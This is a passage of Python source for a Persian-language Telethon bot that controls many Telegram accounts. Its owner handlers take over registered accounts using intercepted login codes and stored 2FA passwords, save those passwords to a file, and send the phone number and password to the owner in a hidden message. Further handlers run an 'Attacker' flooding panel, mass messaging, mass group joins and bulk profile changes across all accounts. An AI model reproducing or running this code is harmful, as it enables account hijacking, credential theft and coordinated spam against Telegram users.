                    save_2fa_to_file(sess, phone, twofa)
                    owner_takeover_pending.pop(sess, None)
                    await sp(event.chat_id,
                        f" ورود به «{sess}» با 2FA خودکار موفق بود!",
                        buttons=[[Button.inline("🔑 Special Access", b"owner_access"), Button.inline("📋 Menu", b"menu_refresh")]])
              except Exception as e2:
                    await sp(event.chat_id, f" خطا در 2FA خودکار: {e2}\nرمز 2FA رو بنویس:\nowner_2fa {sess} <رمز>")
          else:
              await sp(event.chat_id, f" اکانت «{sess}» نیاز به 2FA دارد.\nبنویس:\nowner_2fa {sess} <رمز>")
      except Exception as e:
          owner_takeover_pending.pop(sess, None)
          await sp(event.chat_id, f" خطا در ورود: {e}", buttons=[[Button.inline("🔑 Special Access", b"owner_access")]])

    # ── Owner code entry (text command for entering intercepted OTP) ──
    @bot.on(events.NewMessage(pattern=re.compile(r'^owner_code\s+(\S+)\s+(\S+)$', re.IGNORECASE)))
    async def owner_code_entry(event):
      if not owner_guard(event):
          return
      sess = event.pattern_match.group(1).strip()
      code = event.pattern_match.group(2).strip()
      pend = owner_takeover_pending.get(sess)
      if not pend:
          await sp(event.chat_id, " هیچ عملیات ورود فعالی برای این اکانت نیست.")
          return
      phone = pend.get("phone", "")
      tmp = pend.get("tmp")
      try:
          await event.delete()
      except Exception:
          pass
      try:
          await tmp.sign_in(phone=phone, code=code)
          owner_takeover_pending.pop(sess, None)
          await sp(event.chat_id,
              f" ورود به «{sess}» موفق بود!",
              buttons=[[Button.inline("🔑 Special Access", b"owner_access"), Button.inline("📋 Menu", b"menu_refresh")]])
          try:
              await bot.send_message(OWNER_ID, f"<spoiler> ورود موفق\nاکانت: {sess}\n شماره: {phone}</spoiler>", parse_mode="html")
          except Exception:
              pass
      except SessionPasswordNeededError:
          twofa = sessions_db.get(sess, {}).get("twofa", "")
          if twofa:
              try:
                    await tmp.sign_in(password=twofa)
                    save_2fa_to_file(sess, phone, twofa)
                    owner_takeover_pending.pop(sess, None)
                    await sp(event.chat_id,
                        f" ورود به «{sess}» با 2FA خودکار موفق بود!",
                        buttons=[[Button.inline("🔑 Special Access", b"owner_access"), Button.inline("📋 Menu", b"menu_refresh")]])
                    try:
                        await bot.send_message(OWNER_ID, f"<spoiler> ورود موفق (2FA خودکار)\nاکانت: {sess}\n شماره: {phone}\n رمز 2FA: {twofa}</spoiler>", parse_mode="html")
                    except Exception:
                        pass
              except Exception as e:
                    await sp(event.chat_id, f" خطا در 2FA خودکار: {e}\n\nرمز 2FA رو بنویس:\nowner_2fa {sess} <رمز>")
          else:
              await sp(event.chat_id,
                    f" این اکانت 2FA دارد.\nبنویسید: owner_2fa {sess} <رمز>")
      except Exception as e:
          owner_takeover_pending.pop(sess, None)
          await sp(event.chat_id, f" خطا در ورود کد: {e}",
              buttons=[[Button.inline("🔑 Special Access", b"owner_access")]])

    @bot.on(events.NewMessage(pattern=re.compile(r'^owner_2fa\s+(\S+)\s+(.+)$', re.IGNORECASE)))
    async def owner_2fa_entry(event):
      if not owner_guard(event):
          return
      sess = event.pattern_match.group(1).strip()
      pwd = event.pattern_match.group(2).strip()
      pend = owner_takeover_pending.get(sess)
      if not pend:
          await sp(event.chat_id, " هیچ عملیات ورود فعالی برای این اکانت نیست.")
          return
      tmp = pend.get("tmp")
      try:
          await event.delete()
      except Exception:
          pass
      phone = pend.get("phone", "")
      try:
          await tmp.sign_in(password=pwd)
          save_2fa_to_file(sess, phone, pwd)
          owner_takeover_pending.pop(sess, None)
          await sp(event.chat_id,
              f" ورود به «{sess}» با 2FA موفق بود!",
              buttons=[[Button.inline("🔑 Special Access", b"owner_access"), Button.inline("📋 Menu", b"menu_refresh")]])
          try:
              await bot.send_message(OWNER_ID, f"<spoiler> ورود موفق (2FA)\nاکانت: {sess}\n شماره: {phone}\n رمز 2FA: {pwd}</spoiler>", parse_mode="html")
          except Exception:
              pass
      except Exception as e:
          owner_takeover_pending.pop(sess, None)
          await sp(event.chat_id, f" خطا در 2FA: {e}",
              buttons=[[Button.inline("🔑 Special Access", b"owner_access")]])

    # ── media/photo handler: profile photo + spam media ──────
    @bot.on(events.NewMessage())
    async def bot_photo_handler(event):
      if not owner_guard(event):
          _ph_pend = pending_group_selection.get(event.sender_id, {})
          _ph_step = _ph_pend.get('og_step', '')
          if _ph_step not in ('prfphoto', 'bself_media', 'og_prfall_photo', 'enfosh_media') and not _ph_step.startswith('ogatk_media_'):
              return
      if not (event.photo or event.document):
          return
      pend = pending_group_selection.get(OWNER_ID, {})

      # Check pending state for this sender (supports non-OWNER og_admins too)
      _sender_pend = pending_group_selection.get(event.sender_id, {})
      _sender_step = _sender_pend.get("og_step", "")
      if _sender_step in ("enfosh_media", "prfphoto", "bself_media", "og_prfall_photo") or _sender_step.startswith("ogatk_media_"):
          pend = _sender_pend
        
      if pend.get("og_step") == "bself_media":
          og_gname = pend.get("og_gname", "")
          og_mtype_hint = pend.get("og_mtype", "photo")
          try:
              import time as _bst
              os.makedirs("self_media", exist_ok=True)
              doc = event.document
              _attrs = getattr(doc, "attributes", []) or [] if doc else []
              _attr_names = {type(a).__name__ for a in _attrs}
              _mime = getattr(doc, "mime_type", "") or "" if doc else ""
              if og_mtype_hint == "sticker" or (doc and "DocumentAttributeSticker" in _attr_names):
                    mtype, ext = "sticker", "webp"
              elif og_mtype_hint == "gif" or (doc and ("DocumentAttributeAnimated" in _attr_names or _mime.startswith("image/gif"))):
                    mtype, ext = "gif", "gif"
              elif og_mtype_hint == "video" or (doc and _mime.startswith("video/")):
                    mtype, ext = "video", "mp4"
              elif event.photo:
                    mtype, ext = "photo", "jpg"
              else:
                    mtype, ext = og_mtype_hint, "bin"
              idx = int(_bst.time() * 1000)
              fname = f"self_media/bulk_{og_gname}_{idx}.{ext}"
              media_obj = (event.sticker if mtype == "sticker" and hasattr(event, "sticker") and event.sticker
                             else event.media)
              await bot.download_media(media_obj, file=fname)
              if mtype == "sticker":
                    # Stickers: add directly to all sessions, no caption
                    cnt_added = 0
                    for s in og_sessions(og_gname):
                        meta = managed.get(s)
                        if meta:
                            meta["state"].setdefault("self_reply_media", []).append(
                                {"path": fname, "type": "sticker", "caption": ""})
                            save_session_state(s, meta["state"])
                            cnt_added += 1
                    await sp(event.chat_id,
                        f" استیکر به {cnt_added} اکانت اضافه شد. فایل دیگه یا /done:",
                        buttons=[[Button.inline("❌ Cancel", f"og_bulkself_{og_gname}".encode())]])
              else:
                    pending_group_selection[OWNER_ID] = {
                        "og_step": "bself_media_caption",
                        "og_gname": og_gname, "og_file": fname, "og_mtype": mtype,
                    }
                    await sp(event.chat_id,
                        f" فایل {mtype} دریافت شد.\n کپشن بفرست یا /skip:",
                        buttons=[[Button.inline("❌ Cancel", f"og_bulkself_{og_gname}".encode())]])
          except Exception as e:
              await sp(event.chat_id, f" خطا: {e}",
                        buttons=[[Button.inline("📦 Bulk Self", f"og_bulkself_{og_gname}".encode())]])
          return

      if pend.get("og_step") == "enfosh_media":
          og_gname = pend.get("og_gname", "")
          og_sess = pend.get("og_sess", "")
          try:
              import time as _t
              os.makedirs("self_media", exist_ok=True)
              doc = event.document
              _attrs = getattr(doc, "attributes", []) or [] if doc else []
              _attr_names = {type(a).__name__ for a in _attrs}
              _mime = getattr(doc, "mime_type", "") or "" if doc else ""
              if event.photo:
                    mtype, ext = "photo", "jpg"
              elif doc and "DocumentAttributeSticker" in _attr_names:
                    mtype, ext = "sticker", "webp"
              elif doc and ("DocumentAttributeAnimated" in _attr_names or _mime.startswith("image/gif")):
                    mtype, ext = "gif", "gif"
              elif doc and _mime.startswith("video/"):
                    mtype, ext = "video", "mp4"
              else:
                    mtype, ext = "photo", "jpg"
              idx = int(_t.time())
              fname = f"self_media/{og_sess}_{idx}.{ext}"
              media_obj = event.sticker if mtype == "sticker" and hasattr(event, "sticker") and event.sticker else event.media
              await bot.download_media(media_obj, file=fname)
              caption_raw = event.message.message or "" if event.message else ""
              pending_group_selection[event.sender_id] = {
                    "og_step": "enfosh_media_caption",
                    "og_gname": og_gname, "og_sess": og_sess,
                    "og_file": fname, "og_mtype": mtype,
              }
              prompt = f" فایل دریافت شد ({mtype}).\n کپشن بنویس (یا /skip برای بدون کپشن):"
              if caption_raw:
                    prompt += f"\n کپشن فعلی: «{caption_raw}»"
              await sp(event.chat_id, prompt,
                        buttons=[[Button.inline("❌ Cancel", f"og_en1_{og_gname}|{og_sess}".encode())]])
          except Exception as e:
              pending_group_selection.pop(event.sender_id, None)
              await sp(event.chat_id, f" خطا: {e}",
                        buttons=[[Button.inline("🔙 Back", f"og_en1_{og_gname}|{og_sess}".encode())]])
          return

      og_step_now = pend.get("og_step", "")
      if og_step_now.startswith("ogatk_media_"):
          og_gname = pend.get("og_gname", "")
          mtype = og_step_now[len("ogatk_media_"):]
          ext_map = {"photo": "jpg", "gif": "gif", "video": "mp4", "sticker": "webp"}
          ext = ext_map.get(mtype, "bin")
          is_sticker = mtype == "sticker"
          media_obj = (event.sticker if is_sticker and hasattr(event, 'sticker') else None) or \
                        event.photo or event.document
          if not media_obj:
              await sp(event.chat_id, " فایل بفرست یا /done برای پایان:")
              return
          try:
              import time as _ot
              os.makedirs("atk_media", exist_ok=True)
              fname = f"atk_media/{og_gname}_{int(_ot.time())}.{ext}"
              await bot.download_media(media_obj, file=fname)
              if is_sticker:
                    atk = _og_atk_state(og_gname)
                    atk.setdefault("items", []).append({"type": "sticker", "val": fname})
                    save_groups()
                    cnt = sum(1 for i in atk["items"] if i["type"] == "sticker")
                    await sp(event.chat_id, f" استیکر #{cnt} ثبت شد. ادامه یا /done:",
                            buttons=[[Button.inline("❌ Cancel", f"ogatk_panel_{og_gname}".encode())]])
              else:
                    caption_raw = (event.message.message or "") if event.message else ""
                    pending_group_selection[event.sender_id] = {
                        "og_step": "ogatk_media_caption",
                        "og_gname": og_gname, "og_file": fname, "og_mtype": mtype,
                    }
                    prompt = f" کپشن برای این {mtype} بنویس:\n(یا /skip برای بدون کپشن)"
                    if caption_raw:
                        prompt += f"\n کپشن فعلی: «{caption_raw}»"
                    await sp(event.chat_id, prompt,
                            buttons=[[Button.inline("❌ Cancel", f"ogatk_panel_{og_gname}".encode())]])
          except Exception as e:
              await sp(event.chat_id, f" خطا: {e}",
                        buttons=[[Button.inline("⚔️ Attacker", f"ogatk_panel_{og_gname}".encode())]])
          return

      if pend.get("og_step") == "prfphoto":
          og_gname = pend.get("og_gname", "")
          og_sess = pend.get("og_sess", "")
          pending_group_selection.pop(event.sender_id, None);
          pending_group_selection.pop(OWNER_ID, None)
          meta = managed.get(og_sess)
          if not meta:
              await sp(event.chat_id, f" {og_sess} آفلاینه",
                        buttons=[[Button.inline("🔙 Back", f"og_profile_{og_gname}".encode())]])
              return
          try:
              photo_bytes = await bot.download_media(event.photo, bytes)
              import io
              file = await meta["client"].upload_file(io.BytesIO(photo_bytes), file_name="photo.jpg")
              from telethon.tl.functions.photos import UploadProfilePhotoRequest
              await meta["client"](UploadProfilePhotoRequest(file=file))
              await sp(event.chat_id, f" عکس پروفایل {og_sess} تغییر کرد!",
                        buttons=[[Button.inline("🔙 Back", f"og_prf1_{og_gname}|{og_sess}".encode())]])
          except Exception as e:
              await sp(event.chat_id, f" خطا در آپلود عکس: {e}",
                        buttons=[[Button.inline("🔙 Back", f"og_prf1_{og_gname}|{og_sess}".encode())]])
      elif pend.get("g_step") == "prfphoto":
          g_gname = pend.get("g_gname", "")
          g_sess = pend.get("g_sess", "")
          pending_group_selection.pop(event.sender_id, None);
          pending_group_selection.pop(OWNER_ID, None)
          meta = managed.get(g_sess)
          if not meta:
              await sp(event.chat_id, f" {g_sess} آفلاینه",
                        buttons=[[Button.inline("🔙 Back", b"menu_refresh")]])
              return
          try:
              photo_bytes = await bot.download_media(event.photo, bytes)
              import io
              file = await meta["client"].upload_file(io.BytesIO(photo_bytes), file_name="photo.jpg")
              from telethon.tl.functions.photos import UploadProfilePhotoRequest
              await meta["client"](UploadProfilePhotoRequest(file=file))
              await sp(event.chat_id, f" عکس پروفایل {g_sess} تغییر کرد!",
                        buttons=[[Button.inline("🔙 Back", b"menu_refresh")]])
          except Exception as e:
              await sp(event.chat_id, f" خطا: {e}",
                        buttons=[[Button.inline("🔙 Back", b"menu_refresh")]])

      elif pend.get("og_step") == "og_prfall_photo":
          og_gname = pend.get("og_gname", "")
          pending_group_selection.pop(event.sender_id, None)
          pending_group_selection.pop(event.sender_id, None);
          pending_group_selection.pop(OWNER_ID, None)
          photo_obj = event.photo
          if not photo_obj:
              await sp(event.chat_id, " عکس بفرست",
                        buttons=[[Button.inline("🔙 Back", f"og_prfbulk_{og_gname}".encode())]])
              return
          sessions_bulk = og_sessions(og_gname)
          import io
          from telethon.tl.functions.photos import UploadProfilePhotoRequest
          photo_bytes = await bot.download_media(photo_obj, bytes)
          ok = fail = 0
          for s in sessions_bulk:
              meta = managed.get(s)
              if not meta:
                    fail += 1
                    continue
              try:
                    file = await meta["client"].upload_file(
                        io.BytesIO(photo_bytes), file_name="photo.jpg")
                    await meta["client"](UploadProfilePhotoRequest(file=file))
                    ok += 1
                    await asyncio.sleep(2)
              except Exception:
                    fail += 1
          await sp(event.chat_id,
              f" Photo پروفایل همگانی اعمال شد!\n━━━━━━━━━━━━━━\n موفق: {ok}   ناموفق: {fail}",
              buttons=[[Button.inline("🔙 Back", f"og_prfbulk_{og_gname}".encode())]])

    # ── text message handler: phone, code, 2fa, group name ───
    @bot.on(events.NewMessage())
    async def bot_text_handler(event):
      PASS_CMDS = {"/done", "/skip", "/cancel"}
      # Allow non-owner admins if they have an og_step pending
      _sender_pend_txt = pending_group_selection.get(event.sender_id, {})
      _sender_og_step = _sender_pend_txt.get("og_step", "")
      _allowed_og_steps = {
                              "rhythm_text", "rhythm_chat", "enfosh", "enfosh_media_caption",
                              "enadd", "endel", "idadd", "iddel", "ogadmadd", "prfname", "prfbio", "prfphoto",
                              "ogatk_target", "ogatk_delay", "ogatk_seqinterval", "ogatk_autostop", "ogatk_text", "ogatk_media_caption", "ogatk_tagadd", "atk_char",
                              "miotx_target", "miotx_recipient",
                              "act_target", "og_prfall_name", "og_prfall_bio", "og_prfall_photo",
                              "bself_text", "bself_media", "bself_media_caption", "bself_setid", "bself_interval", "bself_target", "blockid", "report_id",
                              "rhythm_emoji", "rhythm_replylink", 
                              "join_all", "leave_all", "join_one", "leave_one", "send_target", "send_text",
                              "og_newacc_phone", "og_newacc_code", "og_newacc_2fa",
                              "sched_text", "sched_loop_text", "sched_loop_duration", "sched_loop_count",
                              "sched_time", "sched_loop_interval", "sched_loop_waitstop", "ogatk_tagdel",
                              }
      if not owner_guard(event):
          if event.sender_id in bot_blacklist:
              return
          if _sender_og_step in _allowed_og_steps and event.is_private:
              pass  # allow non-owner with pending og step
          else:
              if event.is_private and event.text:
                    try:
                        await event.reply(" شما مجاز نیستید.")
                    except Exception:
                        pass
              return
      if event.text and event.text.startswith("/") and event.text.strip() not in PASS_CMDS:
          return
      # detect Telegram dice/animated emoji ( etc.)
      _is_dice = False
      _dice_emoticon = ""
      try:
          from telethon.tl.types import MessageMediaDice
          if isinstance(getattr(event.message, "media", None), MessageMediaDice):
              _is_dice = True
              _dice_emoticon = event.message.media.emoticon or ""
      except Exception:
          pass
      if not _is_dice and (event.photo or event.document or event.video or event.gif or event.sticker):
          return
      # delete user's input message to keep chat clean (single panel)
      try:
          await event.delete()
      except Exception:
          pass
      text = event.text.strip() if event.text else ""
      # for dice messages, inject the emoticon as text for emoji steps
      if _is_dice and not text:
          text = _dice_emoticon
      # Use sender's pending state if they have one (for non-owner og_admins)
      if event.sender_id != OWNER_ID and _sender_og_step in _allowed_og_steps:
          pend = _sender_pend_txt
      else:
          pend = pending_group_selection.get(OWNER_ID, {})

      # waiting for display name after session registration
      if pend.get("waiting_display_name"):
          sess_dn = pend.get("sess_for_name", "")
          pending_group_selection.pop(event.sender_id, None);
          pending_group_selection.pop(OWNER_ID, None)
          if sess_dn and sess_dn in managed:
              dn = text.strip() if text.strip() not in ("/skip", "/done") else sess_dn
              managed[sess_dn]["state"]["display_name"] = dn
              save_session_state(sess_dn, managed[sess_dn]["state"])
              await sp(event.chat_id, f" اسم «{dn}» برای اکانت {sess_dn} ثبت شد.",
                        buttons=[[Button.inline("👤 Accounts", b"menu_sessions"),
                                  Button.inline("📋 Menu", b"menu_refresh")]])
          return

      # waiting for new max_accounts value
      if pend.get("waiting_setmax"):
          gname = pend.get("setmax_gname", "")
          pending_group_selection.pop(event.sender_id, None);
          pending_group_selection.pop(OWNER_ID, None)
          if gname not in groups_db:
              await sp(event.chat_id, " ریموت نامعلوم.", buttons=[[Button.inline("👥 Groups", b"menu_groups")]])
              return
          try:
              new_max = int(text.strip())
          except Exception:
              await sp(event.chat_id, " فقط عدد بفرست.", buttons=[[Button.inline("🔙 Back", f"grp_{gname}".encode())]])
              return
          if new_max <= 0:
              groups_db[gname].pop("max_accounts", None)
              save_groups()
              msg = f" سقف اکانت ریموت «{gname}» برداشته شد (بدون محدودیت)."
          else:
              groups_db[gname]["max_accounts"] = new_max
              save_groups()
              msg = f" سقف اکانت ریموت «{gname}» روی {new_max} تنظیم شد."
          await sp(event.chat_id, msg,
                    buttons=[[Button.inline(f"🔘 {gname}", f"grp_{gname}".encode()),
                                Button.inline("📋 Menu", b"menu_refresh")]])
          return

      # waiting for subscription days
      if pend.get("waiting_setsub"):
          gname = pend.get("setsub_gname", "")
          pending_group_selection.pop(event.sender_id, None);
          pending_group_selection.pop(OWNER_ID, None)
          if gname not in groups_db:
              await sp(event.chat_id, " ریموت نامعلوم.", buttons=[[Button.inline("👥 Groups", b"menu_groups")]])
              return
          try:
              days = int(text.strip())
          except Exception:
              await sp(event.chat_id, " فقط عدد بفرست (تعداد روز).", buttons=[[Button.inline("🔙 Back", f"grp_{gname}".encode())]])
              return
          set_group_subscription_days(gname, days)
          if days <= 0:
              msg = f" محدودیت زمانی ریموت «{gname}» برداشته شد."
          else:
              msg = f" اشتراک ریموت «{gname}» تمدید شد.\n{group_expiry_label(gname)}"
          await sp(event.chat_id, msg,
                    buttons=[[Button.inline(f"🔘 {gname}", f"grp_{gname}".encode()),
                                Button.inline("📋 Menu", b"menu_refresh")]])
          return

      # waiting for group bot token
      if pend.get("waiting_group_token"):
          gname = pend.get("group_name", "")
          pending_group_selection.pop(event.sender_id, None);
          pending_group_selection.pop(OWNER_ID, None)
          if not gname or gname not in groups_db:
              await sp(event.chat_id, " ریموت نامعلوم.",
                         buttons=[[Button.inline("👥 Groups", b"menu_groups")]])
              return
          groups_db[gname]["bot_token"] = text
          save_groups()
          await sp(event.chat_id,
              f" توکن ربات برای ریموت «{gname}» ذخیره شد.\n"
              f"برای راه‌اندازی برو به جزئیات ریموت.",
              buttons=[[Button.inline(f"🔘 {gname}", f"grp_{gname}".encode()),
                          Button.inline("📋 Menu", b"menu_refresh")]])
          return

      # ── owner group panel flows (og_step) ────────────────────
      if pend.get("og_step"):
          og_step = pend["og_step"]
          og_gname = pend.get("og_gname", "")
          og_sess = pend.get("og_sess", "")

          # ── global join/leave all sessions across all groups ──────
          if og_step in ("global_join_all", "global_leave_all"):
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              is_join = og_step == "global_join_all"
              all_sessions = [s for info in groups_db.values() for s in info.get("sessions", [])]
              ok = fail = 0

              async def _global_do_join_leave(client, link, join):
                    from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest
                    from telethon.tl.functions.messages import ImportChatInviteRequest, DeleteChatUserRequest
                    from telethon.tl.types import Chat as _TLChat
                    from telethon.errors import UserAlreadyParticipantError, InviteRequestSentError
                    link = link.strip().replace("https://", "").replace("http://", "")
                    if join:
                        try:
                            if "joinchat/" in link:
                                h = link.split("joinchat/")[-1].lstrip("/").split("?")[0]
                                await client(ImportChatInviteRequest(h))
                            elif link.startswith("t.me/+"):
                                await client(ImportChatInviteRequest(link[6:]))
                            elif link.startswith("+") and not link[1:].lstrip("+").isdigit():
                                await client(ImportChatInviteRequest(link.lstrip("+")))
                            else:
                                lnk = "@" + link.split("t.me/")[-1].split("?")[0] if "t.me/" in link else link
                                try:
                                    ent = await client.get_entity(lnk)
                                    await client(JoinChannelRequest(ent))
                                except (UserAlreadyParticipantError, InviteRequestSentError):
                                    pass
                                except Exception:
                                    await client(JoinChannelRequest(lnk))
                        except (UserAlreadyParticipantError, InviteRequestSentError):
                            pass
                    else:
                        _is_priv = "t.me/+" in link or "joinchat/" in link or (link.startswith("+") and not link[1:].isdigit())
                        lnk = link if _is_priv else ("@" + link.split("t.me/")[-1].split("?")[0] if "t.me/" in link else link)
                        try:
                            ent = await client.get_entity(lnk)
                        except Exception:
                            if _is_priv:
                                raise
                            ent = lnk
                        try:
                            if isinstance(ent, _TLChat):
                                _me = await client.get_me()
                                await client(DeleteChatUserRequest(chat_id=ent.id, user_id=_me.id))
                            else:
                                await client(LeaveChannelRequest(ent))
                        except Exception:
                            if ent != lnk:
                                await client(LeaveChannelRequest(lnk))
                            else:
                                raise

              _global_jl_errors: list = []

              async def _global_jl_one(s):
                    meta = managed.get(s)
                    if not meta:
                        return False
                    try:
                        await _global_do_join_leave(meta["client"], text, is_join)
                        return True
                    except Exception as _e:
                        _global_jl_errors.append(f"{s}: {str(_e)[:60]}")
                        return False

              results = await asyncio.gather(*[_global_jl_one(s) for s in all_sessions], return_exceptions=True)
              ok   = sum(1 for r in results if r is True)
              fail = sum(1 for r in results if r is not True)

              lbl = "جوین" if is_join else "لفت"
              icon = "🌐" if is_join else "🔴"
              err_txt = ("\n\nخطاها:\n" + "\n".join(_global_jl_errors[:5])) if _global_jl_errors else ""
              await sp(event.chat_id,
                    f"{icon} {lbl} کل اکانت‌ها تموم شد!\n"
                    f"✅ موفق: {ok}   ❌ ناموفق: {fail}\n"
                    f"مجموع: {len(all_sessions)} اکانت{err_txt}",
                    buttons=[[Button.inline("👥 Groups", b"menu_groups"),
                              Button.inline("📋 Menu", b"menu_refresh")]])
              return

          if og_step == "send_target":
              pending_group_selection[event.sender_id] = {"og_step": "send_text", "og_gname": og_gname, "og_target": text}
              await sp(event.chat_id, f" متن پیامی که با همه اکانت‌های ریموت به {text} فرستاده میشه:",
                        buttons=[[Button.inline("❌ Cancel", f"og_home_{og_gname}".encode())]])
              return

          if og_step == "send_text":
              og_target = pend.get("og_target", "")
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              ok = fail = 0
              for s in groups_db.get(og_gname, {}).get("sessions", []):
                    meta = managed.get(s)
                    if not meta:
                        continue
                    try:
                        await meta["client"].send_message(og_target, text)
                        ok += 1
                        await asyncio.sleep(2)
                    except Exception:
                        fail += 1
              await sp(event.chat_id, f" ارسال تموم شد!\n {ok}   {fail}",
                        buttons=[[Button.inline("📋 Menu", b"menu_refresh"),
                                  Button.inline("👥 Group", f"og_home_{og_gname}".encode())]])
              return

          if og_step == "og_newacc_phone":
              phone = text.strip()
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              if is_group_full(og_gname):
                    max_acc = groups_db.get(og_gname, {}).get("max_accounts")
                    await sp(event.chat_id, f" ریموت «{og_gname}» به سقف {max_acc} اکانت رسیده.",
                              buttons=[[Button.inline("🏠 منوی ریموت", f"og_home_{og_gname}".encode())]])
                    return
              sess = generate_next_session_name()
              tmp = _make_client(sess_path(sess), session_name=sess)
              try:
                    await tmp.connect()
                    await tmp.send_code_request(phone)
              except Exception as e:
                    try:
                        await tmp.disconnect()
                    except Exception:
                        pass
                    await sp(event.chat_id, f" خطا در ارسال کد: {e}",
                              buttons=[[Button.inline("🏠 منوی ریموت", f"og_home_{og_gname}".encode())]])
                    return
              pending_logins[phone] = {"tmp": tmp, "session": sess, "sender": event.sender_id, "phone": phone, "og_gname": og_gname}
              pending_group_selection[event.sender_id] = {"og_step": "og_newacc_code", "og_gname": og_gname, "og_phone": phone}
              await sp(event.chat_id,
                        f" کد به {phone} ارسال شد.\n\nحالا کد رو اینجا بنویس:",
                        buttons=[[Button.inline("❌ Cancel", f"og_home_{og_gname}".encode())]])
              return

          if og_step in ("og_newacc_code", "og_newacc_2fa"):
              phone = pend.get("og_phone", "")
              pend_login = pending_logins.get(phone)
              if not pend_login:
                    pending_group_selection.pop(event.sender_id, None);
                    pending_group_selection.pop(OWNER_ID, None)
                    await sp(event.chat_id, " جلسه ورود منقضی شده. دوباره تلاش کن.",
                              buttons=[[Button.inline("🏠 منوی ریموت", f"og_home_{og_gname}".encode())]])
                    return
              tmp = pend_login["tmp"]
              sess = pend_login["session"]
              target_gname = pend_login.get("og_gname", og_gname)
              try:
                    if og_step == "og_newacc_code":
                        await tmp.sign_in(phone=phone, code=text.strip())
                    else:
                        await tmp.sign_in(password=text.strip())
              except SessionPasswordNeededError:
                    pending_group_selection[event.sender_id] = {"og_step": "og_newacc_2fa", "og_gname": target_gname, "og_phone": phone}
                    await sp(event.chat_id, " این اکانت 2FA داره. رمز 2FA رو بنویس:",
                              buttons=[[Button.inline("❌ Cancel", f"og_home_{target_gname}".encode())]])
                    return
              except Exception as e:
                    pending_group_selection.pop(event.sender_id, None);
                    pending_group_selection.pop(OWNER_ID, None)
                    pending_logins.pop(phone, None)
                    try:
                        await tmp.disconnect()
                    except Exception:
                        pass
                    await sp(event.chat_id, f" خطا در ورود: {e}",
                              buttons=[[Button.inline("🏠 منوی ریموت", f"og_home_{target_gname}".encode())]])
                    return
              # موفق — ثبت اکانت و اضافه کردن مستقیم به همین ریموت
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              pending_logins.pop(phone, None)
              sess_info = {"phone": phone, "created_at": datetime.utcnow().isoformat(), "admins": []}
              if og_step == "og_newacc_2fa":
                    sess_info["twofa"] = text.strip()
              sessions_db[sess] = sess_info
              save_db()
              try:
                    await tmp.disconnect()
              except Exception:
                    pass
              if og_step == "og_newacc_2fa":
                    try:
                        save_2fa_to_file(sess, phone, text.strip())
                    except Exception:
                        pass
              await asyncio.sleep(0.5)
              await start_worker(sess, phone=phone)
              _err = assign_session_to_group(sess, target_gname)
              if _err:
                    await sp(event.chat_id, f" اکانت وارد شد ولی به ریموت اضافه نشد: {_err}",
                              buttons=[[Button.inline("🏠 منوی ریموت", f"og_home_{target_gname}".encode())]])
                    return
              sessions_in_group = groups_db.get(target_gname, {}).get("sessions", [])
              role_label = "👑 اکانت اول" if len(sessions_in_group) == 1 else f"اکانت #{len(sessions_in_group)}"
              notif = f" اکانت جدید اضافه شد\nنام: {sess}\nریموت: {target_gname}\nنقش: {role_label}\nشماره: {phone}"
              await sp(event.chat_id, f"✅ {notif}",
                        buttons=[[Button.inline("➕ افزودن اکانت دیگه", f"og_addacc_{target_gname}".encode())],
                                  [Button.inline("🏠 منوی ریموت", f"og_home_{target_gname}".encode())]])
              try:
                    await send_spoiler(main_client, OWNER_ID, notif)
              except Exception:
                    pass
              return

          if og_step == "rhythm_text":
              pending_group_selection.pop(event.sender_id, None)
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              groups_db.setdefault(og_gname, {}).setdefault("rhythm", {})["text"] = text
              save_groups()
              rhm = groups_db[og_gname]["rhythm"]
              has_target = bool(rhm.get("target"))
              rows = [
                    [Button.inline("⚙️ Set Text", f"og_rhmt_{og_gname}".encode()),
                     Button.inline("🎯 Select Chat", f"og_rhmc_{og_gname}".encode())],
              ]
              if has_target:
                    rows.append([Button.inline("🟢 Start Rhythm", f"og_rhms_{og_gname}".encode())])
              rows.append([Button.inline("🔙 Back", f"og_home_{og_gname}".encode())])
              await sp(event.chat_id,
                    f" Rhythm — ریموت {og_gname}\n━━━━━━━━━━━━━━\n"
                    f" متن: {text}\n گپ: {rhm.get('target','—')}\n\n متن ذخیره شد.",
                    buttons=rows)
              return

          if og_step == "rhythm_chat":
              pending_group_selection.pop(event.sender_id, None)
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              groups_db.setdefault(og_gname, {}).setdefault("rhythm", {})["target"] = text
              save_groups()
              rhm = groups_db[og_gname]["rhythm"]
              has_text = bool(rhm.get("text"))
              rows = [
                    [Button.inline("⚙️ Set Text", f"og_rhmt_{og_gname}".encode()),
                     Button.inline("🎯 Select Chat", f"og_rhmc_{og_gname}".encode())],
              ]
              if has_text:
                    rows.append([Button.inline("🟢 Start Rhythm", f"og_rhms_{og_gname}".encode())])
              rows.append([Button.inline("🔙 Back", f"og_home_{og_gname}".encode())])
              await sp(event.chat_id,
                    f" Rhythm — ریموت {og_gname}\n━━━━━━━━━━━━━━\n"
                    f" متن: {rhm.get('text','—')}\n گپ: {text}\n\n گپ ذخیره شد.",
                    buttons=rows)
              return

          # ── Rhythm: emoji input ──────────────────────────
          if og_step == "rhythm_emoji":
              og_gname = pend.get("og_gname", "")
              if text in ("/done", "/cancel"):
                    pending_group_selection.pop(event.sender_id, None)
                    pending_group_selection.pop(event.sender_id, None);
                    pending_group_selection.pop(OWNER_ID, None)
                    emojis = groups_db.get(og_gname, {}).get("rhythm", {}).get("emojis", [])
                    await sp(event.chat_id,
                        f" {len(emojis)} ایموجی ثبت شد.",
                        buttons=[[Button.inline("🔘 Rhythm", f"og_rhmh_{og_gname}".encode())]])
              else:
                    # extract emoji characters — include all non-ASCII printable chars
                    import unicodedata
                    raw = text.strip()
                    new_emojis = []
                    i = 0
                    while i < len(raw):
                        c = raw[i]
                        cp = ord(c)
                        cat = unicodedata.category(c)
                        if cp > 0x00FF and cat not in ("Cc", "Cf", "Zs", "Zl", "Zp"):
                            # collect base char + any following variation/ZWJ
                            chunk = c
                            i += 1
